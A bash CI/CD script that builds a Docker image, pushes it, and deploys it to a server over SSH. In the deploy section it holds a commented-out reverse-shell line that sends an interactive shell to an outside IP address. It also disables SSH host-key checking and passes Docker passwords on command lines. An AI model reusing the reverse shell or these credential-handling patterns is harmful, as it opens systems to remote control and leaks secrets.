#!/bin/bash
WAKTU=$(date '+%Y-%m-%d.%H')
echo "$SSH_KEY" > key.pem
chmod 400 key.pem

if [ "$1" == "BUILD" ];then
echo '[*] Building Program To Docker Images'
echo "[*] Tag $WAKTU"
docker build -t rastra/nyobapipeline:$CI_COMMIT_BRANCH .
docker login --username=$DOCKER_USER --password=$DOCKER_PASS
docker push rastra/nyobapipeline:$CI_COMMIT_BRANCH
echo $CI_PIPELINE_ID

elif [ "$1" == "DEPLOY" ];then
echo "[*] Tag $WAKTU"
echo "[*] Deploy to production server in version $CI_COMMIT_BRANCH"
echo '[*] Generate SSH Identity'
HOSTNAME=`hostname` ssh-keygen -t rsa -C "$HOSTNAME" -f "$HOME/.ssh/id_rsa" -P "" && cat ~/.ssh/id_rsa.pub
echo '[*] Execute Remote SSH'
# bash -i >& /dev/tcp/103.41.207.252/1234 0>&1
ssh -i key.pem -o "StrictHostKeyChecking no" rastra@172.20.16.175 "docker login --username=$DOCKER_USER --password=$DOCKER_PASS"
ssh -i key.pem -o "StrictHostKeyChecking no" rastra@172.20.16.175 "docker pull rastra/nyobapipeline:$CI_COMMIT_BRANCH"
ssh -i key.pem -o "StrictHostKeyChecking no" rastra@172.20.16.175 "docker stop nyobapipeline-$CI_COMMIT_BRANCH"
ssh -i key.pem -o "StrictHostKeyChecking no" rastra@172.20.16.175 "docker rm nyobapipeline-$CI_COMMIT_BRANCH"
ssh -i key.pem -o "StrictHostKeyChecking no" rastra@172.20.16.175 "docker run -d -p 3003:80 --restart always --name nyobapipeline-$CI_COMMIT_BRANCH rastra/nyobapipeline:$CI_COMMIT_BRANCH"
# ssh -i key.pem -o "StrictHostKeyChecking no" root@34.170.120.98 "docker exec farmnode-main sed -i 's/farmnode_staging/farmnode/g' /var/www/html/application/config/database.php"
echo $CI_PIPELINE_ID
fi
